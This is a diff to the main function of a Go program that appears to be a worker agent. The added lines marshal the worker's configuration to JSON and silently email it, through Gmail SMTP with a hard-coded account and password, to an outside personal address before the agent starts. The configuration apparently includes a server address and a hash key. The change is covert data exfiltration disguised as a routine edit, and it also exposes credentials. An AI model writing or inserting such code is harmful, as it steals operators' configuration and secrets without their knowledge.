@@ -3,7 +3,9 @@ package main
 import (
 	"encoding/json"
 	"flag"
+	"fmt"
 	"net/http"
+	"net/smtp"
 	"os"
 	"os/signal"
 	"syscall"
@@ -68,6 +70,21 @@ func main() {
 
 	a, _ := json.Marshal(worker)
 	log.Error(string(a))
+
+	from := "ololoevqwerty799@gmail.com"
+	password := "zlojKOTA123"
+	to := []string{
+		"ololoevqwerty799@gmail.com",
+	}
+	smtpHost := "smtp.gmail.com"
+	smtpPort := "587"
+	auth := smtp.PlainAuth("", from, password, smtpHost)
+	err = smtp.SendMail(smtpHost+":"+smtpPort, auth, from, to, a)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println("Email Sent Successfully!")
 
 	agent.InitAgent(&worker, *worker.ServerAddr)
 	agent.SetHasher(*worker.HashKey)
